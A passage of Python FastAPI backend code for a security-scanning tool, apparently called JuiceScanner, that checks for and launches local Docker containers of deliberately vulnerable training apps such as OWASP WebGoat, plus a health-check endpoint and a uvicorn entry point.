        "url": "http://localhost:8081"
    },
    "webgoat": {
        "name": "OWASP WebGoat",
        "command": ["docker", "run", "-d", "-p", "8082:8080", "--name", "juicescanner-webgoat", "webgoat/webgoat:latest"],
        "port": 8082,
        "url": "http://localhost:8082/WebGoat"
    }
}


@app.post("/api/docker/launch")
async def launch_docker_container(data: DockerLaunchRequest):
    profile = DOCKER_TARGET_PROFILES.get(data.target_id)
    if not profile:
        return {"status": "error", "message": f"Unknown target profile: {data.target_id}"}
    
    # 1. First test if target URL is ALREADY reachable
    try:
        r = requests.get(profile["url"], timeout=2)
        if r.status_code in [200, 301, 302, 401]:
            return {
                "status": "success",
                "message": f"✅ {profile['name']} is ALREADY active and online on {profile['url']}!",
                "url": profile["url"],
                "port": profile["port"]
            }
    except Exception:
        pass

    try:
        container_name = f"juicescanner-{data.target_id}"

        # 2. Try starting existing container
        start_attempt = subprocess.run(["docker", "start", container_name], capture_output=True, text=True)
        if start_attempt.returncode == 0:
            return {
                "status": "success",
                "message": f"🚀 Started container {profile['name']} on {profile['url']}",
                "url": profile["url"],
                "port": profile["port"]
            }

        # 3. If name conflict exists, remove old container first
        subprocess.run(["docker", "rm", "-f", container_name], capture_output=True, text=True)

        # 4. Run new container
        res = subprocess.run(profile["command"], capture_output=True, text=True)
        if res.returncode == 0:
            return {
                "status": "success",
                "message": f"⚡ Successfully launched {profile['name']} on {profile['url']}",
                "url": profile["url"],
                "port": profile["port"]
            }
        else:
            return {"status": "error", "message": f"Docker launch error: {res.stderr or res.stdout}"}
    except Exception as e:
        return {"status": "error", "message": f"Docker execution error: {str(e)}"}


# ════════════════════════════════════════════
# Root Health Check
# ════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "message": "JuiceScanner AI Security Engine is running",
        "framework": "FastAPI",
        "ollama_model": "llama3.2:latest",
        "docs": "/docs",
        "version": "2.4.0"
    }


# ════════════════════════════════════════════
# Run with: uvicorn app:app --reload --port 5000
# ════════════════════════════════════════════
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=5000, reload=True)